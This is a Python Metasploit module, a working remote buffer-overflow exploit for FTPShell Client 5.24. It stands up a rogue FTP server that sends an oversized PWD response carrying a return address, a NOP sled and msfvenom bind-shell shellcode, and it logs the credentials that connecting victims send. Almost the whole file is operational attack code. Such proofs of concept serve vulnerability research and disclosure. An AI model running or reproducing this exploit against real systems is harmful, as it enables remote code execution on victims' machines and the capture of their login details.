#!/usr/bin/env python2.7

# Software Link: http://www.ftpshell.com/downloadclient.htm
# Tested on: Windows 7 enterprise 32bit
# Contact: gusgkr0117@naver.com

import socket
import sys
import os
import time
from metasploit import module

metadata = {
    'name': 'FTPShell Client 5.24 Remote Buffer Overflow',
    'description': '''
        The FTPShell Client 5.24 is vulnerable to execute arbitrary code
    ''',
    'authors':['Yunus YILDIRIM (Th3GundY)', 'CT-Zer0 Team', 'Hyeonhak Kim'],
    'date': '2016-11-18',
    'references':[
        {'type':'cve', 'ref':'2016-xxxx'},
        {'type':'edb', 'ref':'40778'},
    ],
    'type': 'remote_exploit',
    'targets': [
        {'platform': 'Windows', 'arch': 'x86'}
    ]}

def exploit(args):
    target_eip = "\x33\x14\x26\x76" #FF E5 | JMP EBP; <-- you must find address without char '\x00\x0a\x0d\x22\xff'
    s0ck3t = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s0ck3t.bind(("0.0.0.0", 21))
    s0ck3t.listen(5)
    module.log("[*] CT-Zer0 Evil FTP Server Listening port 21\n")

    # \x00\x0a\x0d\x22\xff
    # msfvenom -p windows/shell_bind_tcp LPORT=5656 -f c -b '\x00\x0a\x0d\x22\xff'
    shellcode = ("\xdd\xc4\xd9\x74\x24\xf4\xbe\x28\xda\xdf\x59\x5a\x29\xc9\xb1"
    "\x31\x31\x72\x18\x83\xea\xfc\x03\x72\x3c\x38\x2a\xa5\xd4\x3e"
    "\xd5\x56\x24\x5f\x5f\xb3\x15\x5f\x3b\xb7\x05\x6f\x4f\x95\xa9"
    "\x04\x1d\x0e\x3a\x68\x8a\x21\x8b\xc7\xec\x0c\x0c\x7b\xcc\x0f"
    "\x8e\x86\x01\xf0\xaf\x48\x54\xf1\xe8\xb5\x95\xa3\xa1\xb2\x08"
    "\x54\xc6\x8f\x90\xdf\x94\x1e\x91\x3c\x6c\x20\xb0\x92\xe7\x7b"
    "\x12\x14\x24\xf0\x1b\x0e\x29\x3d\xd5\xa5\x99\xc9\xe4\x6f\xd0"
    "\x32\x4a\x4e\xdd\xc0\x92\x96\xd9\x3a\xe1\xee\x1a\xc6\xf2\x34"
    "\x61\x1c\x76\xaf\xc1\xd7\x20\x0b\xf0\x34\xb6\xd8\xfe\xf1\xbc"
    "\x87\xe2\x04\x10\xbc\x1e\x8c\x97\x13\x97\xd6\xb3\xb7\xfc\x8d"
    "\xda\xee\x58\x63\xe2\xf1\x03\xdc\x46\x79\xa9\x09\xfb\x20\xa7"
    "\xcc\x89\x5e\x85\xcf\x91\x60\xb9\xa7\xa0\xeb\x56\xbf\x3c\x3e"
    "\x13\x4f\x77\x63\x35\xd8\xde\xf1\x04\x85\xe0\x2f\x4a\xb0\x62"
    "\xda\x32\x47\x7a\xaf\x37\x03\x3c\x43\x45\x1c\xa9\x63\xfa\x1d"
    "\xf8\x07\x9d\x8d\x60\xe6\x38\x36\x02\xf6")
    #shellcode = args['payload']

    buffer = "A" * 400 + target_eip + "\x90" * 40 + shellcode

    while True:
        victim, addr = s0ck3t.accept()
        victim.send("220 FTP Service\r\n")
        module.log("[*] Connection accepted from %s\n" % addr[0])
        while True:
            data = victim.recv(1024)
            if "USER" in data:
                victim.send("331 User name okay, need password\r\n\r\n")
                module.log("\t[+] 331 USER = %s" % data.split(" ")[1],)
            elif "PASS" in data:
                victim.send("230 Password accepted.\r\n230 User logged in.\r\n")
                module.log("\t[+] 230 PASS = %s" % data.split(" ")[1],)
            elif "PWD" in data:
                victim.send('257 "' + buffer + '" is current directory\r\n')
                module.log("\t[+] 257 PWD")
                module.log("\n[*] Exploit Sent Successfully\n")


if __name__=='__main__':
    module.run(metadata,exploit)
    
